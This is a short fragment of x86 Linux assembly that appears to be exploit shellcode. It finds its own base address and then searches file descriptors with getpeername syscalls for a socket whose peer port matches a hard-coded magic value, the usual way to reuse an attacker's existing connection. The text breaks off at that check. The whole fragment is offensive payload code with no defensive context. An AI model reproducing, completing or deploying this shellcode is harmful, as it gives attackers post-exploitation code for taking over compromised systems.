normalizeespandebp:
sub  $0x50 , %esp

call geteip
geteip:
pop %ebx
//ebx now has our base!
movl %ebx,%esp
subl $0x1000,%esp
//esp is now a nice value
mov    %esp,%ebp
//ebp is now a nice value too! :>
donenormalize:
mainentrypoint:
//address of j into edi
lea    0xffffffd4(%ebp),%edi
sub    $0x2c,%esp
//i=256*3
mov    $0x300,%ebx
//j=0x10
movl   $0x10,0xffffffd4(%ebp)
lea    0xffffffd8(%ebp),%esi
lea    0x0(%esi),%esi
findsockloop:
//&j
push   %edi
//&addr
push   %esi
//i
push   %ebx
//call get peername
xchg    %ebx,%edx
mov    $0x66,%eax
mov    $0x7,%ebx
lea    0x0(%esp,1),%ecx
int    $0x80
xchg    %ebx,%edx
add    $0x10,%esp
cmp    $0,%eax
jne continueloop
//if we got here, we did got 0 (success) as the result of getpeername()
cmpw   $0x5321,0xffffffda(%ebp)